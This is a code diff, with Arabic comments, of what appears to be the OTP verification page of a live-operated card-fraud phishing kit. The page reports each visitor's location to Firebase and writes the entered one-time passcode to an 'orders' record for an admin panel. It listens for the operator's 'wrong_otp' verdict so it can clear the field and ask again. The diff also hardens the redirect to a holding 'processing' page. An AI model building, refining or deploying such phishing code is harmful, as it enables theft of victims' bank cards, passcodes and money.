@@ -36,7 +36,6 @@
             transition: 0.3s;
         }
 
-        /* تنسيق المربع عند الخطأ */
         .otp-single-field.error-border { border: 2px solid var(--error-red); background-color: #fff8f8; color: var(--error-red); }
 
         #errorMsg { color: var(--error-red); font-size: 12px; font-weight: bold; margin-bottom: 15px; display: none; }
@@ -82,19 +81,18 @@
         const v_id = localStorage.getItem('v_id');
 
         if (v_id) {
-            // تحديث موقع الزائر
             database.ref('live_sessions/' + v_id).update({
                 current_page: "صفحة التحقق (OTP)",
                 last_seen: new Date().getTime()
             });
 
-            // مراقبة لو الأدمن أعطى "رفض" أو "كود خطأ"
+            // مراقبة الأوامر
             database.ref('orders/' + v_id + '/next_step').on('value', (snapshot) => {
                 const step = snapshot.val();
                 if (step === 'wrong_otp') {
                     document.getElementById('otpCode').classList.add('error-border');
                     document.getElementById('errorMsg').style.display = 'block';
-                    document.getElementById('otpCode').value = ''; // مسح الكود القديم
+                    document.getElementById('otpCode').value = ''; 
                     const btn = document.getElementById('confirmBtn');
                     btn.disabled = false;
                     btn.innerText = "تأكيد العملية";
@@ -102,7 +100,6 @@
             });
         }
 
-        // إعداد المؤقت
         let timeLeft = 120;
         const timeDisplay = document.getElementById('timeCount');
         const timerBox = document.getElementById('timerBox');
@@ -131,18 +128,20 @@
                 btn.disabled = true;
                 btn.innerText = "جاري التحقق...";
 
-                // إخفاء رسالة الخطأ لو كانت ظاهرة
                 document.getElementById('otpCode').classList.remove('error-border');
                 document.getElementById('errorMsg').style.display = 'none';
 
-                // تحديث بيانات الكود في الفايربيس
+                // التعديل الهام: نحدث الـ otp ونصفر الـ next_step لـ waiting فوراً
+                // عشان لما يروح لصفحة بروسيسنج ما يرجعش للبطاقة بسبب "wrong_card" قديمة
                 database.ref('orders/' + v_id).update({
-                    otp_code: otpVal, // نضعه في مكان واضح للوحة
+                    otp_code: otpVal,
                     status: "OTP_Submitted",
-                    next_step: "waiting", // نرجعه لوضع الانتظار فوراً عشان ما يكرر الصفحة
+                    next_step: "waiting", 
                     last_update: new Date().getTime()
                 }).then(() => {
-                    // التوجه لصفحة الانتظار لتثبيت العميل
+                    // التحويل لصفحة الانتظار
+                    window.location.replace('processing.html');
+                }).catch(() => {
                     window.location.replace('processing.html');
                 });
             } else {
